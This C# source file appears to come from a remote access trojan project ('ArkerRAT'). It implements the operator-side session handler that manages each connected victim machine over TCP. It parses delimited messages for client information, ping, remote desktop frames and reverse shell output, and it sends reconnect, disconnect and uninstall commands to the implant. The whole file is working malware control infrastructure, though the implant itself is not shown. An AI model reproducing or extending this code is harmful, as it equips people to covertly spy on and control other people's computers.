﻿using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Controls;
using System;
using System.Windows;
using System.Diagnostics;
using ArkerRatWpfVersion;
using System.Windows.Markup;
using System.Xml.Linq;
using System.Collections.Concurrent;

namespace ArkerRAT1
{
    public class RATHostSession
    {
        public CancellationTokenSource source = new CancellationTokenSource();
        CancellationToken token;

        //This button is too know which client button belongs to which client.
        public Button clientButton = new Button();
        public int port = 0;
        public string tags { get; set; }
        public double ms = 0;
        public string clientInfo = "Unknown\tUnknown\tUnknown";

        public TcpClient client { get; set; }
        public NetworkStream clientStream { get; set; }
        public RATHostSession(TcpClient tcpClient, string tag, int porte)
        {
            port = porte;
            client = tcpClient;
            clientStream = tcpClient.GetStream();
            token = source.Token;
            clientButton.Tag = tag;
            tags = tag;

            ReadData();
            Ping();
            
        }

        public async Task SendData(string textData)
        {
                try
                {
                    byte[] data = Encoding.UTF8.GetBytes(textData);
                    await clientStream.WriteAsync(data, 0, data.Length);
                    await clientStream.FlushAsync();
                }
            catch(Exception ex) { }
        }
        

        public string data = string.Empty;
        private async void ReadData()
        {
            StringBuilder stringBuilder = new StringBuilder();

            await Task.Run(async () =>
            {
                try
                {
                    while (!token.IsCancellationRequested)
                    {
                        byte[] buffer = new byte[GlobalVariables.byteSize];
                        int bytesRead = await clientStream.ReadAsync(buffer, 0, buffer.Length);

                        if (bytesRead > 0)
                        {
                            string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            stringBuilder.Append(receivedData);

                            

                            lock (GlobalVariables._lock)
                            {
                                data += stringBuilder.ToString();
                            }

                            await Task.Run(() => SortData("§ClientInfoStart§", "§ClientInfoEnd§"));
                            await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
                            await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
                            await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));


                            stringBuilder.Clear();
                        }

                        await Task.Delay(1);
                    }
                }
                catch (Exception ex) { }
            });
        }

        public string[] resulotion;
        private async void SortData(string startDelimiter, string endDelimiter)
        {
            do
            {
                lock (GlobalVariables._lock)
                {
                    int startIndex = data.IndexOf(startDelimiter) + startDelimiter.Length;
                    int endIndex = data.IndexOf(endDelimiter) - 1;

                   

                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&&startIndex<=endIndex+1)
                    {
                        string subString = string.Empty;

                        lock (GlobalVariables._lock)
                        {
                                subString = data.Substring(startIndex, endIndex - startIndex + 1);   
                            data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);
                        }

                        //if (subString?.Length != null || subString?.Length != 0)
                        if (startDelimiter == "§ReverseShellStart§")
                        {
                            reverseShellWindow.ReversShellFunction(subString);
                        }
                        else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
                        {
                            //Assing data to remotedesktop class.
                            remoteDesktopWindow.frameQue.Enqueue(subString);                       
                        }
                        else if (startDelimiter == "§PingStart§")
                        {
                            whenToStartPinging = "§Ping§";
                        }
                        else if (startDelimiter == "§ClientInfoStart§")
                        {
                            int startIndexx = subString.IndexOf("§ResulotionStart§") + 17;
                            int endIndexx = subString.IndexOf("§ResulotionEnd§")-1;
                            string info = subString.Substring(startIndexx, endIndexx - startIndexx + 1);
                            resulotion = info.Split(',');

                            string tempInfo = subString.Replace("§ResulotionStart§" + info + "§ResulotionEnd§", string.Empty);

                            clientInfo = string.Empty;

                            foreach (var clientInfoData in tempInfo.Split(','))
                                clientInfo += clientInfoData + "\t";
                        }                      
                    }
                    else
                    {
                        break;
                    }
                }
              
            } while (true);
        }

        string whenToStartPinging = "";
        Stopwatch stopwatch;
        private async void Ping()
        {
            await Task.Run(async() =>
            {
                while (!token.IsCancellationRequested)
                {
                    Task.Delay(1);
                    if (whenToStartPinging == "")
                    {
                        stopwatch = Stopwatch.StartNew();
                        whenToStartPinging = "Wait for callback";
                        await SendData("§PingStart§§PingEnd§");
                    }

                    if (whenToStartPinging == "§Ping§")
                    {
                        ms = stopwatch.ElapsedMilliseconds;
                        whenToStartPinging = "";
                        stopwatch.Stop();
                    }
                    
                    if (stopwatch.ElapsedMilliseconds == 25000)
                    {
                        stopwatch.Stop();
                        RemoveThisClientUI();
                        await SendData("§ReconnectStart§§ReconnectEnd§");
                    }
                }
                
            });
        }
        public void RemoveThisClientUI()
        {
            Task.Run(() =>
            {
                ArkerRATServerMechanics.rATClients.Remove(this);
                source.Cancel();
                clientStream.Close();
                client.Close();
                if (reverseShellWindow != null)
                {
                    reverseShellWindow.Close();
                }
            }); 
        }
        public async void Disconnect(object sender, EventArgs e)
        {
            RemoveThisClientUI();
            await SendData("§DisconnectStart§§DisconnectEnd§");
        }


        public async void Uninstall(object sender, EventArgs e)
        {
            RemoveThisClientUI();
            await SendData("§UninstallStart§§UninstallEnd§");

        }

        public ReverseShellWindow reverseShellWindow;
        public bool reverseShellWindowIsAlreadyOpen = false;
        public void StartReverseShell(object sender, EventArgs e)
        {   if(!reverseShellWindowIsAlreadyOpen)
            {
                reverseShellWindow = new ReverseShellWindow(this);
                reverseShellWindow.WindowState = WindowState.Normal;
                reverseShellWindow.Activate();
                reverseShellWindow.Show();
            }
        }

        public RemoteDesktopWindow remoteDesktopWindow;
        public bool remoteDesktopWindowIsAlreadyOpen = false;
        public void StartRemoteDesktop(object sender, EventArgs e)
        {
            if (!remoteDesktopWindowIsAlreadyOpen)
            {
                remoteDesktopWindow = new RemoteDesktopWindow(this);
                remoteDesktopWindow.WindowState = WindowState.Normal;
                remoteDesktopWindow.Activate();
                remoteDesktopWindow.Show();
            }
        }
    }
}
